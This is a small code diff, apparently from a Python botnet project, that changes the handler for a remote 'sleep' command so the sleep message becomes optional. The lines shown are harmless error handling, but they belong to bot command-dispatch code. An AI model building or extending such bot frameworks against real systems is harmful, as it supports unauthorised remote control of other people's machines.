@@ -48,7 +48,12 @@ def execute_scripts(command, pybotnet_up_time, logger):
 def execute_do_sleep(command, logger):
     comm = split_command(command)
     try:
-        do_sleep(seconds=comm[1], logger=logger, sleep_message=comm[2])
+        sleep_message = comm[2]
+    except:
+        sleep_message = ''
+
+    try:
+        do_sleep(seconds=comm[1], logger=logger, sleep_message=sleep_message)
         logger.info('do_sleep done')
         return 'do_sleep done'
     except:
